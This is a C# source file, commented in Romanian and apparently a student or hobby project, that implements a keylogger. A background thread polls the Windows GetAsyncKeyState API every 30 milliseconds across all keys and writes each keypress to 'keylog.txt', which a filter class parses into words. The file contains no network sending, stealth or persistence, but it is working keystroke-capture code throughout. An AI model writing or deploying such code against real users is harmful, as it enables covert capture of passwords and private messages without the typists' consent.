/*
    Aceasta clasa are rolul de a captura apsarea tastelor de catre utilizator, salvandu-le ulterior
    intr-un fisier numit "keylog.txt".
    M-am folosit de un thread nou pentru a rula in paralel cu aplicatia principala. Capturarea tastelor se face prin
    intermediul Windows API (GetAsyncKeyState), acestea fiind adaugate la un string ce contine "Key: " (pentru readability).
    String-ul este inserat in fisierul "keylog.txt", utilizat de clasa FiltruLogs pentru parsarea cuvintelor.
    Clasa contine metoda GetText() ce aplica filtrul asupra fisierului si extrage cuvintele relevante.
 */

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    public class keyLogger
    {
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(Keys vKey);   // Metoda Windows API

        private string _text;
        private bool _isRunning;    // Status thread
        private Thread _keyLoggerThread;    //thread KeyLogger
        FiltruLogs filter;          // Filtru pentru formarea cuvintelor
        private HashSet<Keys> _pressedKeys;

        public keyLogger()
        {
            filter = new FiltruLogs();
            _pressedKeys = new HashSet<Keys>();
            _text = "";
            _isRunning = false;
            File.WriteAllText("keylog.txt", string.Empty);
            File.WriteAllText("filtrat.txt", string.Empty);
        }

        public void Start()
        {
            if (!_isRunning)
            {
                _text = "";
                _isRunning = true;
                _keyLoggerThread = new Thread(new ThreadStart(Run));
                _keyLoggerThread.Start();
            }
        }

        public void Stop()
        {
            if (_isRunning)
            {
                _isRunning = false;
                _keyLoggerThread.Join();
            }
        }

        private void Run()
        {
            while (_isRunning)
            {
                KeyPressed();
                Thread.Sleep(30);
            }
        }

        public void KeyPressed()
        {
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
            {
                int state = GetAsyncKeyState(key);
                if (state == 1 || state == -32767)
                {
                    if (!_pressedKeys.Contains(key))
                    {
                        _pressedKeys.Add(key);
                        _text += key.ToString();
                        string log = $"Key: {key} ";
                        File.AppendAllText("keylog.txt", log + Environment.NewLine);
                    }
                }
                else
                {
                    if (_pressedKeys.Contains(key))
                    {
                        _pressedKeys.Remove(key);
                    }
                }
            }
        }
            public string GetText() { return filter.Filtrare_Text(); }
    }
}
